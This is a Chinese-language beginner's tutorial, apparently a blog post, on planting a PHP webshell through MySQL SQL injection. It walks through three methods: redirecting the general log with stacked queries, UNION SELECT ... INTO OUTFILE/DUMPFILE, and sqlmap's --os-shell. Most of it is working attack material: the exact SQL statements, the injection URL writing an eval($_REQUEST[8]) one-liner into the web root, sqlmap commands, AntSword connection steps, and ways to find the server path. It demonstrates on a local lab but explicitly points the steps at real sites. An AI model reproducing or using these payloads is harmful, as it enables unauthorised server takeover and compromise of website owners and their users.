注释: 适合小白，大佬可以绕道

 **(1).日志法拿shelll(这个适合于存在堆叠注入和已经登录上MYSQL的数据库管理工具的时候，还需要知道网站根目录的决对路径)**

1.首先解释一下的什么是堆叠注入:就是通过 ; 隔断后可以执行第二条SQL语句如下面的SQL语句,通过;隔断后两个SQL语句依然可以执行

![1666349924_63527b6434b61d129a125.png!small](https://image.3001.net/images/20221021/1666349924_63527b6434b61d129a125.png!small)

2.然后的话就是日志法拿shell的方法，首先需要通过show variables like '%general%';
查看这个数据库日志是不是开启了,还可以查到一些数据库的路径

![1666350325_63527cf5dfb8e34d423b4.png!small](https://image.3001.net/images/20221021/1666350325_63527cf5dfb8e34d423b4.png!small)

3.如果general_log是off,代表该数据的日志是关闭的，所以需要通过set global general_log = on;来开启

![1666350469_63527d857be479db45e21.png!small](https://image.3001.net/images/20221021/1666350469_63527d857be479db45e21.png!small)

4.当然开启日志以后我们需要将日志文件的路径改在网站根目录下，由于我使用的是phpstudy搭建的php网站，而这个MYSQL在phpstudy搭建的环境当做一般是和WWW也就是网站根目录在一个目录下的，所以可以将日志文件的路径改在网站根目录下，文件类型是php文件，这样后面就可以写一句话木马了,这里设置的日志文件路径是在G:/Desktop/web/WWW里面的guo.php

![1666350849_63527f014ecd939c6cab2.png!small](https://image.3001.net/images/20221021/1666350849_63527f014ecd939c6cab2.png!small)

5.可以看到已经有一个日志文件生成在网站根目录下面了

![1666350917_63527f453fb32e7104214.png!small](https://image.3001.net/images/20221021/1666350917_63527f453fb32e7104214.png!small)

6.这个时候只需要执行含有一句话木马的SQL语句就可以了

比如说

select '<?php eval($_REQUEST)?>';

![1666351677_6352823d98517f1d1ab1a.png!small](https://image.3001.net/images/20221021/1666351677_6352823d98517f1d1ab1a.png!small)

7.然后就可以看到一句话木马在这个日志文件里面

![1666351794_635282b2dc465bfcf9268.png!small](https://image.3001.net/images/20221021/1666351794_635282b2dc465bfcf9268.png!small)

8.直接用蚁剑连接，密码是8,拿下网站

![1666351824_635282d0cda6000b1d993.png!small](https://image.3001.net/images/20221021/1666351824_635282d0cda6000b1d993.png!small)

9.如果是实战过程也就是http://xxx/xxxx.php?id=1 这样的的网站，利用的二次注入方法就是

<http://xxx/xxxx.php?id=1;>

在这个;后面执行依次上面的语句

10.那么最后是如何知道路径，有这几种方法

第一种方法是: 在id = [1] 这个就是直接将参数传一个数组一般情况下会报错，或者传一些特殊的参数也可以，特殊的符号如 % @

第二种方法是通过: 网站泄露的一些敏感目录，获取敏感信息，得到路径，比如说探针，找这些敏感路径的方法可以通过目录扫描

第三种方法就是通过查数据库的路径,通过

select @@datadir; 查询后通过推测网站根目录

 **(2)通过写文件函数into outfile 和 into dumpfile拿shell(这个只需要相对路径)**

实现这个方法的前提:

web目录具有写权限，能够使用单引号

知道网站根目录相当于数据库的相对路径(这个容易猜)

secure_file_priv没有具体值,也就是在my.ini这个文件里面

![1666352929_63528721e7818e1b25ae4.png!small](https://image.3001.net/images/20221021/1666352929_63528721e7818e1b25ae4.png!small)

1.利用过程,这边利用本地搭建的靶场测试,在下图可以看到测试出的两个输出点在2和3，这个很重要因为一句话木马需要写在这个输出点的位置

![1666353051_6352879b8fdacdf7f6b0e.png!small](https://image.3001.net/images/20221021/1666353051_6352879b8fdacdf7f6b0e.png!small)

2.然后就是http://127.0.0.1/sqlilabs/Less-1/index.php?id=9.999 ' union select
1,'<?php eval($_REQUEST[8])?>',3 into outfile '../../WWW/ld.php' -- qwe
这个里面outfile可以替换为dumpfile是一样的效果,这个网站根目录相对路径一般是 ../.../WWW ../../
刚好可以从库名文件跳到data再跳到同时存在WWW和data的目录

执行上面的http://127.0.0.1/sqlilabs/Less-1/index.php?id=9.999 ' union select
1,'<?php eval($_REQUEST[8])?>',3 into outfile '../../WWW/ld.php' -- qwe
刚好可以将文件写在网站根目录下面,里面包含一句话木马

![1666353814_63528a9647b6974a4f304.png!small](https://image.3001.net/images/20221021/1666353814_63528a9647b6974a4f304.png!small)

3.直接拿蚁剑连接，密码为8

![1666353865_63528ac9011c718df5982.png!small](https://image.3001.net/images/20221021/1666353865_63528ac9011c718df5982.png!small)

4.对于路径问题可以写相对的也可以写绝对的

获取路径的方法和第一种拿shell的一样

 **(3)sqlmap拿shell**

1.首先需要 python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/index.php?id=1'
--is-dba 测试网站

current user is DBA: True 这个是否为True

![1666354433_63528d01a10e254a9afa4.png!small](https://image.3001.net/images/20221021/1666354433_63528d01a10e254a9afa4.png!small)

如果为True可以进行下一步

2.通过sqlmap-master>python sqlmap.py -u
http://127.0.0.1/sqlilabs/Less-1/index.php?id=1' --os-shell

拿shell，下面有几个在跑包的时候可能会出现选项

第一个默认y

![1666354535_63528d67d634d4baa76c5.png!small](https://image.3001.net/images/20221021/1666354535_63528d67d634d4baa76c5.png!small)

2.第二个选择语言，上面站就用什么语言，这个是php的站所以我用4

![1666354568_63528d88c18ae3fd2eb71.png!small](https://image.3001.net/images/20221021/1666354568_63528d88c18ae3fd2eb71.png!small)

3.然后选择语言后，还有选择也是y

![1666354641_63528dd11e545ad9fd96d.png!small](https://image.3001.net/images/20221021/1666354641_63528dd11e545ad9fd96d.png!small)

![1666354663_63528de7ca270bdc64864.png!small](https://image.3001.net/images/20221021/1666354663_63528de7ca270bdc64864.png!small)

5.选择好后输入路径 G:\Desktop\web\WWW 这个是根目录

![1666354827_63528e8bf0b01a3e17e59.png!small](https://image.3001.net/images/20221021/1666354827_63528e8bf0b01a3e17e59.png!small)

6.拿下权限

![1666354860_63528eac8f695148177f4.png!small](https://image.3001.net/images/20221021/1666354860_63528eac8f695148177f4.png!small)

有个os-shell会话出现就可以在里面执行cmd命令

